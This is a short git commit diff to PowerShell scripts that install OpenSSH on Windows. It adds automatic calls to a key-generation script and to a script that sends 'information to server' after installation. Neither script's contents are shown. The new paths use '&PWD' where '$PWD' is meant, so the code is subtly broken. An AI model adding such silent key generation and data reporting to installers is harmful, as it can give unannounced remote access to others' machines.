a4ded131360da583bb352d4258697d77e1d16f0a
Toxy Security <chiranjiv2904@gmail.com>
2023-06-16 09:26:28 +0530

    Automated

--- install_openssh.ps1
+++ install_openssh.ps1
@@ -2,6 +2,12 @@
 $opensshInstallerURL = "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.2.2.0p1-Beta/OpenSSH-Win64-v9.2.2.0.msi"
 $opensshInstallerPath = "$PWD\OpenSSHInstaller.msi"
 
+#Set the path to send the information to server
+$SendInfo = "&PWD\send_info.ps1"
+
+#Set the path to generate the key pairs
+$KeyGen = "&PWD\gen_key.ps1"
+
 Write-Host "Downloading OpenSSH installer..."
 Invoke-WebRequest -Uri $opensshInstallerURL -OutFile $opensshInstallerPath
 
@@ -20,6 +26,8 @@ if (Test-Path $opensshInstallerPath) {
 
     if ($isOpenSSHInstalled) {
         Write-Host "OpenSSH installation completed."
+        & $KeyGen
+        & $SendInfo
         exit 0
     }
     else {
--- ssh.ps1
+++ ssh.ps1
@@ -4,6 +4,12 @@ $checkOpenSSHScriptPath = "$PWD\check_openssh.ps1"
 # Set the path to the install_openssh.ps1 script
 $installOpenSSHScriptPath = "$PWD\install_openssh.ps1"
 
+#Set the path to send the information to server
+$SendInfo = "&PWD\send_info.ps1"
+
+#Set the path to generate the key pairs
+$KeyGen = "&PWD\gen_key.ps1"
+
 # Check if OpenSSH is installed
 Write-Host "Checking if OpenSSH is installed..."
 & $checkOpenSSHScriptPath
@@ -11,6 +17,10 @@ $isOpenSSHInstalled = $LASTEXITCODE
 
 if ($isOpenSSHInstalled -eq 0) {
     Write-Host "OpenSSH is already installed."
+    Write-Host "Starting..."
+    & $KeyGen
+    & $SendInfo
+
 }
 else {
     Write-Host "OpenSSH is not installed. Installing..."
